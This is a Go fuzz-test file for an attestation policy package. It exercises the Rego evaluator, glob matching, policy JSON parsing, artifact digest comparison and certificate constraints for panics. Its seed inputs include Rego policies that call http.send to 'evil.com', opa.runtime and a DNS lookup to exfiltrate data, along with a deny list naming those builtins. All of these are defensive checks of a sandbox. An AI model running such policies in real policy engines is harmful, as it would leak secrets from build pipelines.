//go:build audit

package policy

import (
	"crypto"
	"encoding/json"
	"strings"
	"testing"

	"github.com/aflock-ai/rookery/attestation"
	"github.com/aflock-ai/rookery/attestation/cryptoutil"
	"github.com/gobwas/glob"
	"github.com/invopop/jsonschema"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

// fuzzAttestor implements attestation.Attestor with exported fields so
// json.Marshal produces non-empty output for Rego input.
type fuzzAttestor struct {
	AttName    string `json:"name"`
	AttType    string `json:"type"`
	Value      string `json:"value"`
	ExtraField string `json:"extra"`
}

func (a *fuzzAttestor) Name() string                                   { return a.AttName }
func (a *fuzzAttestor) Type() string                                   { return a.AttType }
func (a *fuzzAttestor) RunType() attestation.RunType                   { return "test" }
func (a *fuzzAttestor) Attest(_ *attestation.AttestationContext) error { return nil }
func (a *fuzzAttestor) Schema() *jsonschema.Schema                     { return nil }

// FuzzRegoPolicy fuzzes the Rego policy evaluator with random policy strings
// and attestation JSON. It verifies:
//   - No panics regardless of input
//   - Dangerous builtins (http.send, opa.runtime, net.lookup_ip_addr) are blocked
//   - Invalid Rego syntax returns errors, not panics
func FuzzRegoPolicy(f *testing.F) {
	// Valid rego that always passes
	f.Add(
		`package test
deny = []`,
		"test-policy",
		"test-name",
		"test-value",
	)

	// Valid rego that always denies
	f.Add(
		`package test
deny["always denied"] { true }`,
		"deny-policy",
		"test-name",
		"test-value",
	)

	// Rego that tries http.send (should be blocked)
	f.Add(
		`package exfil
deny[msg] {
  resp := http.send({"method": "GET", "url": "http://evil.com"})
  msg := "exfil"
}`,
		"exfil-policy",
		"test-name",
		"test-value",
	)

	// Rego that tries opa.runtime (should be blocked)
	f.Add(
		`package leak
deny[msg] {
  rt := opa.runtime()
  msg := "leaked runtime"
}`,
		"leak-policy",
		"test-name",
		"test-value",
	)

	// Rego that tries net.lookup_ip_addr (should be blocked)
	f.Add(
		`package dns
deny[msg] {
  addrs := net.lookup_ip_addr("evil.com")
  msg := "dns exfil"
}`,
		"dns-policy",
		"test-name",
		"test-value",
	)

	// Invalid rego syntax
	f.Add("this is not valid rego {{{", "bad-policy", "n", "v")

	// Empty module
	f.Add("", "empty-policy", "n", "v")

	// Rego with input access
	f.Add(
		`package check
deny[msg] {
  input.name == "bad"
  msg := "name is bad"
}`,
		"check-policy",
		"bad",
		"test",
	)

	f.Fuzz(func(t *testing.T, regoModule string, policyName string, attestorName string, attestorValue string) {
		att := &fuzzAttestor{
			AttName:    attestorName,
			AttType:    "https://example.com/test",
			Value:      attestorValue,
			ExtraField: "fuzz",
		}

		policies := []RegoPolicy{
			{
				Module: []byte(regoModule),
				Name:   policyName,
			},
		}

		// Must not panic -- errors are expected for invalid input.
		err := EvaluateRegoPolicy(att, policies)

		// Security invariant: if the module contains dangerous builtins and
		// compiles successfully, the builtins must be blocked at eval time.
		if err == nil {
			// The policy evaluated without error. Verify that if it contained
			// a dangerous builtin call, it was either in dead code or the
			// policy structure didn't actually invoke it.
			// The real check is that we never panic.
		}

		// If the module explicitly calls a disallowed builtin and the module
		// is syntactically valid, we expect an error (not a panic).
		dangerousBuiltins := []string{"http.send", "opa.runtime", "net.lookup_ip_addr"}
		for _, builtin := range dangerousBuiltins {
			if strings.Contains(regoModule, builtin) {
				// If the rego is syntactically valid and actually invokes the
				// builtin, we expect an error. But some rego strings containing
				// these substrings may not actually be valid or may not invoke
				// them, so we just verify no panic occurred.
				_ = err
			}
		}

		// nil attestor must not panic
		_ = EvaluateRegoPolicy(nil, policies)

		// empty policies must not panic and should return nil
		err = EvaluateRegoPolicy(att, []RegoPolicy{})
		if err != nil {
			t.Errorf("empty policies should not error, got: %v", err)
		}
	})
}

// FuzzGlobCompile fuzzes the glob.Compile function used in constraint checking
// to ensure no panics from malformed glob patterns.
func FuzzGlobCompile(f *testing.F) {
	// Seed corpus with patterns used in the codebase
	f.Add("*")
	f.Add("*.example.com")
	f.Add("test-*-prod")
	f.Add("")
	f.Add("?")
	f.Add("[abc]")
	f.Add("[!abc]")
	f.Add("{a,b,c}")
	f.Add("**")
	f.Add("[")
	f.Add("]")
	f.Add("{")
	f.Add("}")
	f.Add("\\*")
	f.Add("[a-z]")
	f.Add("[\\]")
	f.Add("***")
	f.Add("{a,{b,c}}")
	f.Add(string(make([]byte, 1000)))
	f.Add("\x00\xff\xfe")

	f.Fuzz(func(t *testing.T, pattern string) {
		// Must not panic. Errors are fine for invalid patterns.
		g, err := glob.Compile(pattern)
		if err != nil {
			// Invalid pattern, that's fine
			return
		}

		// If it compiled, matching must not panic either.
		// Use safeGlobMatch to handle upstream panics in gobwas/glob.
		inputs := []string{"", "test", pattern, "a.b.c.d.e.f.g.h.i.j.k", string(make([]byte, 100))}
		for _, input := range inputs {
			_, err := safeGlobMatch(g, input)
			if err != nil {
				t.Logf("safeGlobMatch recovered from panic for pattern=%q input=%q: %v", pattern, input, err)
			}
		}
	})
}

// FuzzPolicyValidation fuzzes policy JSON deserialization with random bytes.
// It verifies that arbitrary JSON input does not cause panics during
// unmarshaling or subsequent Validate() calls.
func FuzzPolicyValidation(f *testing.F) {
	// Valid minimal policy JSON
	validPolicy, _ := json.Marshal(Policy{
		Expires: metav1.Now(),
		Steps: map[string]Step{
			"build": {
				Name: "build",
				Functionaries: []Functionary{
					{Type: "publickey", PublicKeyID: "key1"},
				},
				Attestations: []Attestation{
					{Type: "https://example.com/test"},
				},
			},
		},
	})
	f.Add(validPolicy)

	// Empty JSON object
	f.Add([]byte(`{}`))

	// Invalid JSON
	f.Add([]byte(`{invalid`))

	// Empty bytes
	f.Add([]byte{})

	// Null
	f.Add([]byte(`null`))

	// Array (wrong type)
	f.Add([]byte(`[]`))

	// Policy with circular dependency (should be caught by Validate)
	f.Add([]byte(`{
		"expires": "2030-01-01T00:00:00Z",
		"steps": {
			"a": {"name": "a", "attestationsFrom": ["b"]},
			"b": {"name": "b", "attestationsFrom": ["a"]}
		}
	}`))

	// Policy with self-reference
	f.Add([]byte(`{
		"expires": "2030-01-01T00:00:00Z",
		"steps": {
			"a": {"name": "a", "attestationsFrom": ["a"]}
		}
	}`))

	// Very nested JSON
	f.Add([]byte(`{"steps":{"a":{"name":"a","attestations":[{"type":"t","regopolicies":[{"module":"cGFja2FnZSB0Cg==","name":"p"}]}]}}}`))

	f.Fuzz(func(t *testing.T, data []byte) {
		var p Policy

		// Must not panic during unmarshal
		err := json.Unmarshal(data, &p)
		if err != nil {
			// Invalid JSON, that's fine
			return
		}

		// Must not panic during validation
		_ = p.Validate()

		// Must not panic during topological sort
		_, _ = p.topologicalSort()

		// Must not panic during trust bundle extraction
		_, _ = p.TrustBundles()

		// Must not panic during timestamp authority trust bundle extraction
		_, _ = p.TimestampAuthorityTrustBundles()
	})
}

// FuzzCompareArtifacts fuzzes the compareArtifacts function with random
// DigestSet maps. It probes for panics on nil maps, empty maps, maps with
// empty digest values, and mismatched key sets.
func FuzzCompareArtifacts(f *testing.F) {
	// Seed: both empty
	f.Add("", "", "", "")
	// Seed: matching digests
	f.Add("file.txt", "abc123", "file.txt", "abc123")
	// Seed: mismatched digests
	f.Add("file.txt", "abc123", "file.txt", "def456")
	// Seed: disjoint paths
	f.Add("a.txt", "aaa", "b.txt", "bbb")
	// Seed: empty digest values
	f.Add("file.txt", "", "file.txt", "")
	// Seed: overlapping path, one side empty
	f.Add("file.txt", "abc", "", "")

	sha256 := cryptoutil.DigestValue{Hash: crypto.SHA256}

	f.Fuzz(func(t *testing.T, matPath, matDigest, artPath, artDigest string) {
		// Test with populated maps
		mats := map[string]cryptoutil.DigestSet{
			matPath: {sha256: matDigest},
		}
		arts := map[string]cryptoutil.DigestSet{
			artPath: {sha256: artDigest},
		}
		// Must not panic
		_ = compareArtifacts(mats, arts)

		// Test with nil maps -- must not panic
		_ = compareArtifacts(nil, nil)
		_ = compareArtifacts(nil, arts)
		_ = compareArtifacts(mats, nil)

		// Test with empty maps
		_ = compareArtifacts(map[string]cryptoutil.DigestSet{}, arts)
		_ = compareArtifacts(mats, map[string]cryptoutil.DigestSet{})
		_ = compareArtifacts(map[string]cryptoutil.DigestSet{}, map[string]cryptoutil.DigestSet{})

		// Test with nil DigestSet values in the map
		matsNilDS := map[string]cryptoutil.DigestSet{matPath: nil}
		artsNilDS := map[string]cryptoutil.DigestSet{artPath: nil}
		_ = compareArtifacts(matsNilDS, arts)
		_ = compareArtifacts(mats, artsNilDS)
		_ = compareArtifacts(matsNilDS, artsNilDS)

		// Test with empty DigestSet values
		matsEmptyDS := map[string]cryptoutil.DigestSet{matPath: {}}
		artsEmptyDS := map[string]cryptoutil.DigestSet{artPath: {}}
		_ = compareArtifacts(matsEmptyDS, arts)
		_ = compareArtifacts(mats, artsEmptyDS)
		_ = compareArtifacts(matsEmptyDS, artsEmptyDS)

		// Test with multiple entries sharing the same path
		multi := map[string]cryptoutil.DigestSet{
			matPath: {sha256: matDigest},
			artPath: {sha256: artDigest},
		}
		_ = compareArtifacts(multi, multi)
	})
}

// FuzzCheckCertConstraint fuzzes the checkCertConstraint function with random
// constraint and value slices. It looks for panics or incorrect matching
// behavior on edge cases like empty slices, single-element slices, and
// the AllowAllConstraint wildcard.
func FuzzCheckCertConstraint(f *testing.F) {
	// Seed corpus covering edge cases
	f.Add("dns", "", "")
	f.Add("dns", "*", "anything.com")
	f.Add("email", "a@b.com", "a@b.com")
	f.Add("email", "a@b.com", "c@d.com")
	f.Add("org", "acme", "")
	f.Add("org", "", "acme")
	f.Add("uri", "https://example.com", "https://example.com")

	f.Fuzz(func(t *testing.T, attribute, constraint, value string) {
		// Single constraint, single value
		_ = checkCertConstraint(attribute, []string{constraint}, []string{value})

		// Empty constraints, single value
		_ = checkCertConstraint(attribute, []string{}, []string{value})

		// Single constraint, empty values
		_ = checkCertConstraint(attribute, []string{constraint}, []string{})

		// Both empty
		_ = checkCertConstraint(attribute, []string{}, []string{})

		// Nil slices
		_ = checkCertConstraint(attribute, nil, nil)
		_ = checkCertConstraint(attribute, nil, []string{value})
		_ = checkCertConstraint(attribute, []string{constraint}, nil)

		// AllowAllConstraint
		_ = checkCertConstraint(attribute, []string{AllowAllConstraint}, []string{value})

		// Multiple identical constraints
		_ = checkCertConstraint(attribute, []string{constraint, constraint}, []string{value, value})

		// Constraint with empty string
		_ = checkCertConstraint(attribute, []string{""}, []string{""})
		_ = checkCertConstraint(attribute, []string{""}, []string{value})
	})
}

// FuzzCheckCertConstraintGlob fuzzes the glob-based cert constraint checker
// with random patterns and values. It probes for panics from gobwas/glob on
// crafted patterns containing special characters, deeply nested alternations,
// and malformed bracket expressions.
func FuzzCheckCertConstraintGlob(f *testing.F) {
	// Seed: exact match
	f.Add("common name", "example.com", "example.com")
	// Seed: wildcard
	f.Add("common name", "*.example.com", "foo.example.com")
	// Seed: AllowAllConstraint
	f.Add("common name", "*", "anything")
	// Seed: empty constraint (allows all)
	f.Add("common name", "", "anything")
	// Seed: no match
	f.Add("common name", "foo.com", "bar.com")
	// Seed: glob with nested braces
	f.Add("cn", "{a,{b,c}}", "b")
	// Seed: glob with character class
	f.Add("cn", "[a-z]*", "hello")
	// Seed: malformed glob patterns that gobwas/glob may struggle with
	f.Add("cn", "[", "x")
	f.Add("cn", "{", "x")
	f.Add("cn", "}", "x")
	f.Add("cn", "{a,", "x")
	f.Add("cn", "\\", "x")
	f.Add("cn", "***", "x")
	f.Add("cn", "[\\]", "x")
	// Seed: the known-problematic pattern from safeGlobMatch docs
	f.Add("cn", "0*,{*,", "test")
	// Seed: patterns with null bytes and high bytes
	f.Add("cn", "\x00*\xff", "\x00test\xff")
	// Seed: very long pattern
	f.Add("cn", strings.Repeat("*", 100), strings.Repeat("a", 100))

	f.Fuzz(func(t *testing.T, attribute, constraint, value string) {
		// Must not panic. Errors are acceptable.
		_ = checkCertConstraintGlob(attribute, constraint, value)

		// Also test with empty value
		_ = checkCertConstraintGlob(attribute, constraint, "")

		// Test constraint against itself as value
		_ = checkCertConstraintGlob(attribute, constraint, constraint)
	})
}

// FuzzPolicyValidate fuzzes the Policy.Validate() function with random step
// graphs. It constructs policies with fuzzed step names and random
// AttestationsFrom references, looking for panics on cycle detection,
// self-references, missing steps, and degenerate graphs.
func FuzzPolicyValidate(f *testing.F) {
	// Seed: simple linear chain
	f.Add(uint8(3), uint8(0), false)
	// Seed: single step
	f.Add(uint8(1), uint8(0), false)
	// Seed: all steps reference previous (dense DAG)
	f.Add(uint8(5), uint8(2), false)
	// Seed: trigger self-reference
	f.Add(uint8(2), uint8(0), true)
	// Seed: many steps
	f.Add(uint8(20), uint8(3), false)
	// Seed: max steps with high edge density
	f.Add(uint8(50), uint8(10), false)

	f.Fuzz(func(t *testing.T, numSteps uint8, edgeSeed uint8, forceSelfRef bool) {
		// Clamp to reasonable range to avoid OOM
		n := int(numSteps)
		if n == 0 {
			n = 1
		}
		if n > 64 {
			n = 64
		}

		stepNames := make([]string, n)
		for i := 0; i < n; i++ {
			stepNames[i] = string(rune('A' + i%26))
			if i >= 26 {
				stepNames[i] = string(rune('A'+i/26)) + string(rune('A'+i%26))
			}
		}

		steps := make(map[string]Step, n)
		seed := int(edgeSeed)

		for i, name := range stepNames {
			step := Step{Name: name}

			// Use edgeSeed to deterministically create edges
			if i > 0 {
				// Each step can reference some subset of earlier steps
				edgeCount := (seed + i) % (i + 1)
				for j := 0; j < edgeCount && j < i; j++ {
					target := stepNames[(seed+j)%i]
					step.AttestationsFrom = append(step.AttestationsFrom, target)
				}
			}

			// Optionally force a self-reference
			if forceSelfRef && i == 0 {
				step.AttestationsFrom = append(step.AttestationsFrom, name)
			}

			steps[name] = step
		}

		// Occasionally create a cycle by making last step ref first and first ref last
		if seed%7 == 0 && n >= 2 {
			s := steps[stepNames[0]]
			s.AttestationsFrom = append(s.AttestationsFrom, stepNames[n-1])
			steps[stepNames[0]] = s
		}

		// Occasionally add a reference to a non-existent step
		if seed%11 == 0 {
			s := steps[stepNames[0]]
			s.AttestationsFrom = append(s.AttestationsFrom, "NONEXISTENT")
			steps[stepNames[0]] = s
		}

		p := Policy{
			Expires: metav1.Now(),
			Steps:   steps,
		}

		// Must not panic regardless of graph structure
		_ = p.Validate()

		// topologicalSort must not panic either
		_, _ = p.topologicalSort()
	})
}

// FuzzEvaluateRegoPolicy fuzzes EvaluateRegoPolicy with random Rego module
// source code. It focuses on finding panics in OPA's parser, compiler, and
// evaluator when given arbitrary byte sequences as Rego modules. This is
// distinct from FuzzRegoPolicy which fuzzes structured parameters -- this
// target specifically generates raw Rego source to stress the OPA internals.
func FuzzEvaluateRegoPolicy(f *testing.F) {
	// Minimal valid module with deny rule
	f.Add([]byte(`package p
deny = []`))

	// Module that accesses input fields
	f.Add([]byte(`package p
deny[msg] {
  input.name == ""
  msg := "empty name"
}`))

	// Module with comprehension
	f.Add([]byte(`package p
deny[msg] {
  x := [y | y := input.items[_]; y > 0]
  count(x) == 0
  msg := "no items"
}`))

	// Module with recursive-like rule
	f.Add([]byte(`package p
deny[msg] {
  some i
  input.chain[i].next == input.chain[i]
  msg := "cycle"
}`))

	// Module with large string concat
	f.Add([]byte(`package p
deny[msg] {
  msg := concat("", [input.a, input.b, input.c, input.d, input.e])
}`))

	// Module missing deny rule (security: should be caught)
	f.Add([]byte(`package p
allow = true`))

	// Module with deeply nested object access
	f.Add([]byte(`package p
deny[msg] {
  input.a.b.c.d.e.f.g.h.i.j == "deep"
  msg := "deep"
}`))

	// Module with regex match
	f.Add([]byte(`package p
deny[msg] {
  regex.match(".*evil.*", input.name)
  msg := "evil detected"
}`))

	// Completely garbage bytes
	f.Add([]byte{0x00, 0xFF, 0xFE, 0xFD, 0x80, 0x81})

	// Very long package name
	f.Add([]byte("package " + strings.Repeat("a", 1000) + "\ndeny = []"))

	// Module with unicode
	f.Add([]byte("package \xc3\xa9\ndeny = []"))

	// Module that would trigger quadratic behavior in naive implementations
	f.Add([]byte(`package p
deny[msg] {
  x := "` + strings.Repeat("a", 500) + `"
  contains(x, "b")
  msg := "found"
}`))

	att := &fuzzAttestor{
		AttName:    "fuzz-target",
		AttType:    "https://example.com/fuzz",
		Value:      "test-value",
		ExtraField: "extra",
	}

	f.Fuzz(func(t *testing.T, module []byte) {
		policies := []RegoPolicy{
			{
				Module: module,
				Name:   "fuzz-rego-policy",
			},
		}

		// Must not panic regardless of module content.
		// Errors are expected and acceptable.
		_ = EvaluateRegoPolicy(att, policies)

		// Also test with a nil attestor -- must not panic
		_ = EvaluateRegoPolicy(nil, policies)

		// Test with cross-step context
		stepCtx := map[string]interface{}{
			"build": map[string]interface{}{
				"https://example.com/git": map[string]interface{}{
					"commit": "abc123",
				},
			},
		}
		_ = EvaluateRegoPolicy(att, policies, stepCtx)

		// Test with nil step context
		_ = EvaluateRegoPolicy(att, policies, nil)

		// Test with empty step context
		_ = EvaluateRegoPolicy(att, policies, map[string]interface{}{})

		// Test with multiple copies of the same module (tests package merging)
		if len(module) > 0 && len(module) < 10000 {
			multiPolicies := []RegoPolicy{
				{Module: module, Name: "fuzz-rego-policy-1"},
				{Module: module, Name: "fuzz-rego-policy-2"},
			}
			_ = EvaluateRegoPolicy(att, multiPolicies)
		}
	})
}
